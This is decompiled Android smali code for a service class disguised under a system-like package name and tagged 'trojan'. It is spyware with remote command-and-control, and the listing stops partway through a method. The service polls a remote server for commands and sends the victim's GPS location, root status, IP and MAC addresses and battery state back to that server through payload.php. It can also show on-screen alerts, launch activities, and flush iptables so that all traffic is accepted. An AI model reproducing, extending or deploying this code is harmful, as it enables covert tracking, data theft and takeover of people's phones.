.class public Los/system/System;
.super Landroid/app/Service;
.source "System.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Los/system/System$PayloadWebTask;
    }
.end annotation


# static fields
.field public static TAG:Ljava/lang/String;

.field private static alert_durasi:I

.field private static alert_letak:I

.field private static alert_warna:I

.field private static install_app:Ljava/lang/String;

.field private static install_paket:Ljava/lang/String;

.field private static jcamera:I

.field public static payloadWebResult:Ljava/lang/String;

.field public static payloadWebResultSwitch:Ljava/lang/String;

.field public static payloadWebResultTarget:Ljava/lang/String;


# instance fields
.field private binder:Los/system/CamRuntime$LocalBinder;

.field private broreceiver:Landroid/content/BroadcastReceiver;

.field private camHandler:Landroid/os/Handler;

.field private camRefresh:Ljava/lang/Runnable;

.field private camServiceConeksi:Landroid/content/ServiceConnection;

.field private insHandler:Landroid/os/Handler;

.field private insRefresh:Ljava/lang/Runnable;

.field public ip:Ljava/lang/String;

.field private ipflush:[Ljava/lang/String;

.field private mHandler:Landroid/os/Handler;

.field private mRefresh:Ljava/lang/Runnable;

.field private receAction:Los/system/ReceiverBoot;

.field private seteditor:Landroid/content/SharedPreferences$Editor;

.field private settings:Landroid/content/SharedPreferences;

.field temp:Z

.field private term:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 52
    const-string v0, "trojan"

    sput-object v0, Los/system/System;->TAG:Ljava/lang/String;

    .line 53
    const-string v0, ""

    sput-object v0, Los/system/System;->payloadWebResult:Ljava/lang/String;

    .line 54
    const-string v0, ""

    sput-object v0, Los/system/System;->payloadWebResultTarget:Ljava/lang/String;

    .line 55
    const-string v0, ""

    sput-object v0, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    .line 58
    const v0, 0x1c9ff1

    sput v0, Los/system/System;->jcamera:I

    .line 59
    const/16 v0, -0x100

    sput v0, Los/system/System;->alert_warna:I

    .line 60
    const/16 v0, 0x31

    sput v0, Los/system/System;->alert_letak:I

    .line 61
    const/16 v0, 0x1b58

    sput v0, Los/system/System;->alert_durasi:I

    .line 62
    const-string v0, ""

    sput-object v0, Los/system/System;->install_app:Ljava/lang/String;

    .line 63
    const-string v0, ""

    sput-object v0, Los/system/System;->install_paket:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 4

    .prologue
    const/4 v3, 0x1

    .line 39
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 41
    const/16 v0, 0x8

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "iptables -F"

    aput-object v2, v0, v1

    const-string v1, "iptables -X"

    aput-object v1, v0, v3

    const/4 v1, 0x2

    const-string v2, "iptables -t nat -F"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "iptables -t mangle -F"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "iptables -t mangle -X"

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "iptables -P INPUT ACCEPT"

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "iptables -P OUTPUT ACCEPT"

    aput-object v2, v0, v1

    const/4 v1, 0x7

    const-string v2, "iptables -p FORWARD ACCEPT"

    aput-object v2, v0, v1

    iput-object v0, p0, Los/system/System;->ipflush:[Ljava/lang/String;

    .line 56
    const-string v0, ""

    iput-object v0, p0, Los/system/System;->ip:Ljava/lang/String;

    .line 70
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Los/system/System;->mHandler:Landroid/os/Handler;

    .line 71
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Los/system/System;->camHandler:Landroid/os/Handler;

    .line 72
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Los/system/System;->insHandler:Landroid/os/Handler;

    .line 74
    iput-boolean v3, p0, Los/system/System;->temp:Z

    .line 75
    new-instance v0, Los/system/System$1;

    invoke-direct {v0, p0}, Los/system/System$1;-><init>(Los/system/System;)V

    iput-object v0, p0, Los/system/System;->insRefresh:Ljava/lang/Runnable;

    .line 99
    new-instance v0, Los/system/System$2;

    invoke-direct {v0, p0}, Los/system/System$2;-><init>(Los/system/System;)V

    iput-object v0, p0, Los/system/System;->mRefresh:Ljava/lang/Runnable;

    .line 113
    new-instance v0, Los/system/System$3;

    invoke-direct {v0, p0}, Los/system/System$3;-><init>(Los/system/System;)V

    iput-object v0, p0, Los/system/System;->camRefresh:Ljava/lang/Runnable;

    .line 693
    new-instance v0, Los/system/System$7;

    invoke-direct {v0, p0}, Los/system/System$7;-><init>(Los/system/System;)V

    iput-object v0, p0, Los/system/System;->camServiceConeksi:Landroid/content/ServiceConnection;

    return-void
.end method

.method static synthetic access$000(Los/system/System;)Ljava/lang/Runnable;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->insRefresh:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$100(Los/system/System;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->insHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$1000(Los/system/System;)Los/system/CamRuntime$LocalBinder;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->binder:Los/system/CamRuntime$LocalBinder;

    return-object v0
.end method

.method static synthetic access$1002(Los/system/System;Los/system/CamRuntime$LocalBinder;)Los/system/CamRuntime$LocalBinder;
    .locals 0

    .prologue
    .line 39
    iput-object p1, p0, Los/system/System;->binder:Los/system/CamRuntime$LocalBinder;

    return-object p1
.end method

.method static synthetic access$1100(Los/system/System;)Landroid/content/ServiceConnection;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->camServiceConeksi:Landroid/content/ServiceConnection;

    return-object v0
.end method

.method static synthetic access$1200()I
    .locals 1

    .prologue
    .line 39
    sget v0, Los/system/System;->alert_letak:I

    return v0
.end method

.method static synthetic access$1300()I
    .locals 1

    .prologue
    .line 39
    sget v0, Los/system/System;->alert_warna:I

    return v0
.end method

.method static synthetic access$200()Ljava/lang/String;
    .locals 1

    .prologue
    .line 39
    sget-object v0, Los/system/System;->install_paket:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$300(Los/system/System;)Los/system/ReceiverBoot;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    return-object v0
.end method

.method static synthetic access$400()Ljava/lang/String;
    .locals 1

    .prologue
    .line 39
    sget-object v0, Los/system/System;->install_app:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$500(Los/system/System;)Ljava/lang/Runnable;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->mRefresh:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$600(Los/system/System;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->mHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$700(Los/system/System;)Ljava/lang/Runnable;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->camRefresh:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$800(Los/system/System;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/System;->camHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$900()I
    .locals 1

    .prologue
    .line 39
    sget v0, Los/system/System;->jcamera:I

    return v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 589
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 4

    .prologue
    .line 594
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 595
    const-string v0, "Settings"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Los/system/System;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Los/system/System;->settings:Landroid/content/SharedPreferences;

    .line 596
    iget-object v0, p0, Los/system/System;->settings:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    iput-object v0, p0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    .line 598
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 599
    const-string v1, "android.intent.action.DATE_CHANGED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 600
    const-string v1, "android.intent.action.HEADSET_PLUG"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 601
    const-string v1, "android.intent.action.SCREEN_ON"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 602
    const-string v1, "android.intent.action.ACTION_POWER_CONNECTED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 603
    const-string v1, "android.intent.action.ACTION_POWER_DISCONNECTED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 604
    const-string v1, "android.intent.action.MANAGE_NETWORK_USAGE"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 605
    const-string v1, "android.intent.action.AIRPLANE_MODE"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 606
    const-string v1, "android.intent.action.SCREEN_OFF"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 608
    new-instance v1, Los/system/ReceiverBoot;

    invoke-direct {v1}, Los/system/ReceiverBoot;-><init>()V

    iput-object v1, p0, Los/system/System;->broreceiver:Landroid/content/BroadcastReceiver;

    .line 609
    new-instance v1, Los/system/ReceiverBoot;

    invoke-direct {v1}, Los/system/ReceiverBoot;-><init>()V

    iput-object v1, p0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    .line 610
    iget-object v1, p0, Los/system/System;->broreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Los/system/System;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 611
    iget-object v0, p0, Los/system/System;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/System;->mRefresh:Ljava/lang/Runnable;

    const-wide/16 v2, 0x1388

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 612
    return-void
.end method

.method public onDestroy()V
    .locals 3

    .prologue
    .line 632
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 633
    iget-object v0, p0, Los/system/System;->broreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Los/system/System;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 634
    iget-object v0, p0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "cekversion"

    const-string v2, "destroy"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 635
    iget-object v0, p0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 636
    iget-object v0, p0, Los/system/System;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/System;->mRefresh:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 637
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    .prologue
    .line 617
    sget-object v0, Los/system/System;->TAG:Ljava/lang/String;

    const-string v1, "service start oke"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 618
    new-instance v0, Los/system/System$6;

    const-wide/16 v2, 0x1f4

    const-wide/16 v4, 0x64

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Los/system/System$6;-><init>(Los/system/System;JJ)V

    .line 625
    invoke-virtual {v0}, Los/system/System$6;->start()Landroid/os/CountDownTimer;

    .line 627
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method

.method public payload(Landroid/content/Context;)V
    .locals 18

    .prologue
    .line 145
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/inpayload.txt"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "text"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 146
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/swthread.txt"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "sw"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 147
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/target.txt"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "target"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 149
    const/4 v2, 0x1

    invoke-static {v2}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v2

    .line 151
    sget-object v3, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "...payload client : "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 153
    sget-object v3, Los/system/System;->payloadWebResultTarget:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_17

    .line 155
    sget-object v2, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    const-string v3, "hidup"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    sget-object v2, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    const-string v3, "mati"

    .line 156
    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 158
    :cond_0
    sget-object v2, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    const-string v3, "hidup"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_a

    .line 159
    sget-object v2, Los/system/System;->TAG:Ljava/lang/String;

    const-string v3, ">>>> MODE SUPER AKTIF..........."

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 160
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v3, "swmain"

    sget-object v4, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 161
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 170
    :cond_1
    :goto_0
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "gps"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 171
    new-instance v2, Los/system/GPSresult;

    move-object/from16 v0, p1

    invoke-direct {v2, v0}, Los/system/GPSresult;-><init>(Landroid/content/Context;)V

    sget-object v2, Los/system/GPSresult;->gpsResult:Ljava/lang/String;

    .line 172
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 174
    :cond_2
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "alert"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 175
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "alert ditampilkan"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 177
    const-string v2, "alert"

    const/4 v3, 0x1

    move-object/from16 v0, p1

    invoke-static {v0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 179
    :cond_3
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "cekroot"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 180
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v2

    .line 182
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "root:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 184
    :cond_4
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "status"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 185
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "root: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\nswitch: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->settings:Landroid/content/SharedPreferences;

    const-string v4, "swmain"

    const-string v5, ""

    .line 186
    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\nipadrs: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/4 v3, 0x1

    .line 187
    invoke-static {v3}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\nmacads: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "wlan0"

    .line 188
    invoke-static {v3}, Los/system/Identitas;->getMACAddress(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\nbatery: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->batStatus:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 190
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 193
    :cond_5
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "layar"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 194
    new-instance v2, Landroid/content/Intent;

    const-class v3, Los/system/MainScreen;

    move-object/from16 v0, p1

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 195
    const/high16 v3, 0x10000000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 196
    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 198
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

